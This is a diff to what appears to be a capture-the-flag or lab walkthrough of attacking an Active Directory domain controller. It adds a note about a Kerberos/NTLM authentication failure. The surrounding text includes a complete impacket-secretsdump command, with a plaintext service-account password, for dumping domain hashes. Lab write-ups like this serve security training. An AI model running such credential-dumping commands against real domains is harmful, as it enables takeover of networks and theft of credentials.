@@ -460,7 +460,9 @@ SMB         dc.ext.darkhaven.local 445    DC               [+] ext.darkhaven.loc
 ```
 Using kerberos authentication i see that the ldap_svc account is an administrator on the domain controller
 
-So ive got two options here i can either setup a realm and attempt to autheticate to winrm on the dc using `ldap_svc` or i can use `ldap_svc` access to perform a secretsdump and get the administrator hash then winrm that way!
+NTLM auth failed this tells me this user is in the protected users group
+
+So ive got two options here i can either setup a realm and attempt to authenticate to winrm on the dc using `ldap_svc` or i can use `ldap_svc` access to perform a secretsdump and get the administrator hash then winrm that way!
 
 ```python
 impacket-secretsdump ext.darkhaven.local/'ldap_svc':'6trfgvb**hs#@jskKFHJAh34'@dc.ext.darkhaven.local -k
